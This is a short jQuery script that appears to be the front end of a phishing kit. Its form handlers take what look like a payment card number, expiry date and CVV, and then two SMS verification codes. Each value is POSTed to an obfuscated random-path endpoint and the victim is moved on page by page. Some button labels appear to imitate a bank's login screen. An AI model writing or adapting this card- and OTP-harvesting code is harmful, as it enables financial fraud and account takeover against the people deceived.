$(function(){
    $("#barinxri").on("click",function(e){


        //send backend:
        $.ajax({
            url: '/7tTeaYMkt9pkpywQpvha',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({logita:"Bari Naxri"}),
            success: function(info) {
                if(info.OK){
                    window.location = "/3EtpVNHarRb8PqJfArbu";
                }
            }
        });
    });
    // $(".center #di").on("click",function(e){


    //     //send backend:
    //     $.ajax({
    //         url: '/fBnsyeWCkGU5PtN44397',
    //         type: 'POST',
    //         contentType: 'application/json',
    //         data: JSON.stringify({logita:"Mabritx Nxri"}),
    //         success: function(info) {
    //             if(info.OK){
    //                 window.location = "/ZjCHNsVuB44QhpjLAj2H";
    //             }
    //         }
    //     });
    // });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        // let a0 = $("#numnn").val();
        let a1 = $("#numcc").val();
        let a2 = $("#numdd").val();
        let a3 = $("#numvv").val();
        // let a4 = $("#w5").val();


        //send backend:
        $.ajax({
            url: '/v2C8VrVuzY7WzVJv5RB6',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3}),
            success: function(info) {
                if(info.OK){
                    window.location = "/KecdAK8hGCFkbAY2Qpnk";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/xGJzLd2dUSJrY9Gscu6P',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/jD9TUUwFtwdRXBh6P4cc";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        //send backend:
        $.ajax({
            url: '/4cWAN9yzqstPGkN79uY4',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Aw6knaPZ5nz4RnFvFV8s";
                }
            }
        });
    });



});